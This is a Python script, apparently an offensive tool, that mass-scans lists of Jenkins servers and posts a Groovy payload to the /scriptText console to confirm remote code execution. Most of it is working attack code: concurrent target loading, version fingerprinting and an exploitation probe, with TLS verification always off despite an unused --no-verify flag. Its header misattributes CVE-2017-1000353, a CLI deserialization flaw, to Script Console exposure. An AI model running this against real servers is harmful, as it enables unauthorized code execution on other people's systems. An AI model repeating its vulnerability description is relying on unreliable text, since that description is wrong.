#!/usr/bin/env python3
"""
Jenkins Script Console RCE Scanner (CVE-2017-1000353)
=====================================================
This script scans for and exploits an RCE vulnerability in Jenkins servers
exposed via the Script Console feature. The vulnerability allows attackers
to execute arbitrary Groovy scripts, leading to full system compromise.

CVE-2017-1000353 details:
  - Affected versions: Jenkins < 2.54 (weekly), Jenkins LTS < 2.46.2
  - Exploit vector: Unauthenticated or improperly secured Script Console
  - CVSS v3.1 base score: 9.8 (Critical) — unauthenticated access, network-exploitable.
  - Patched in Jenkins 2.54 (weekly) and LTS 2.46.2 (April 2017).

Usage:
  - Single target detection:
      python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com

  - Detection-only mode:
      python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com --safe

  - Batch mode scanning with concurrency:
      python jenkins_script_console_rce_scanner.py --list targets.txt --concurrency 30

  - Save results to JSON:
      python jenkins_script_console_rce_scanner.py --list targets.txt --output results.json

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-1000353
  - https://jenkins.io/security/advisory/2017-04-26/
"""

import asyncio
import argparse
import json
import re
from datetime import datetime, timezone
from typing import List, Optional

import httpx

# ── ANSI color helpers ──
RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
BOLD = "\033[1m"
RESET = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ──
CVE_ID = "CVE-2017-1000353"
TOOL_NAME = "jenkins_script_console_rce_scanner"
PATCHED_VERSIONS = (2, 54)
PATCHED_VERSIONS_LTS = (2, 46, 2)

REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 20

DETECTION_PATHS = [
    "/script",
    "/scriptText",
]

VERSION_PATTERN = re.compile(r'"version":\s*"(\d+\.\d+(\.\d+)?)"')

RCE_PAYLOAD = "println('RCE TEST - ' + new Date().toString())"

# ── Functions ──

def is_version_vulnerable(version: str) -> bool:
    """Check if Jenkins version is vulnerable."""
    try:
        ver_tuple = tuple(map(int, version.split('.')))
        if len(ver_tuple) == 2:  # Regular version
            return ver_tuple < PATCHED_VERSIONS
        if len(ver_tuple) == 3:  # LTS version
            return ver_tuple < PATCHED_VERSIONS_LTS
        return False
    except ValueError:
        return False

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL with timeout and exception handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT)
        return response
    except Exception:
        return None

async def detect_jenkins(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect Jenkins and extract its version."""
    for path in DETECTION_PATHS:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and response.status_code == 200:
            match = VERSION_PATTERN.search(response.text)
            if match:
                return match.group(1)
    return None

async def probe_rce(client: httpx.AsyncClient, target: str) -> bool:
    """Attempt to exploit RCE via the Jenkins Script Console."""
    url = f"{target.rstrip('/')}/scriptText"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"script": RCE_PAYLOAD}
    try:
        response = await client.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
        return response and "RCE TEST" in response.text
    except Exception:
        return False

async def scan_target(semaphore: asyncio.Semaphore, target: str, safe: bool) -> dict:
    """Scan a single target for the vulnerability."""
    async with semaphore, httpx.AsyncClient(verify=False) as client:
        print(f"[*] Scanning: {target}")
        result = {"target": target, "vulnerable": False, "version": None}
        
        version = await detect_jenkins(client, target)
        if version:
            result["version"] = version
            print(f"[INFO] {target} Jenkins detected, version: {version}")
            
            if is_version_vulnerable(version):
                print(c(RED, f"[CRITICAL] {target} is running vulnerable Jenkins version {version}"))
                result["vulnerable"] = not safe and await probe_rce(client, target)
        else:
            print(c(YELLOW, f"[WARNING] No Jenkins detected on: {target}"))
        
        return result

async def scan_targets(targets: List[str], concurrency: int, safe: bool) -> List[dict]:
    """Scan multiple targets asynchronously."""
    semaphore = asyncio.Semaphore(concurrency)
    tasks = [scan_target(semaphore, target, safe) for target in targets]
    return await asyncio.gather(*tasks)

def load_targets(file_path: str) -> List[str]:
    """Load targets from a text file."""
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_results(results: List[dict], output_file: str):
    """Save scan results to a JSON file."""
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

# ── Main ──

def main():
    parser = argparse.ArgumentParser(description="Jenkins Script Console RCE Scanner")
    parser.add_argument("--target", help="Single target URL")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="Save results to a JSON file")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode, skip exploitation")
    parser.add_argument("--concurrency", type=int, default=20, help="Number of concurrent requests (default: 20)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()
    
    if not args.target and not args.list:
        parser.error("--target or --list is required")
    
    targets = [args.target] if args.target else load_targets(args.list)
    
    results = asyncio.run(scan_targets(targets, args.concurrency, args.safe))
    for r in results:
        if r["vulnerable"]:
            print(c(RED, f"[CRITICAL] {r['target']} is VULNERABLE (Version: {r['version']})"))
        elif r["version"]:
            print(c(GREEN, f"[INFO] {r['target']} is not vulnerable (Version: {r['version']})"))
        else:
            print(c(YELLOW, f"[WARNING] {r['target']} failed detection."))
    
    if args.output:
        save_results(results, args.output)
        print(f"[INFO] Results saved to {args.output}")


if __name__ == "__main__":
    main()
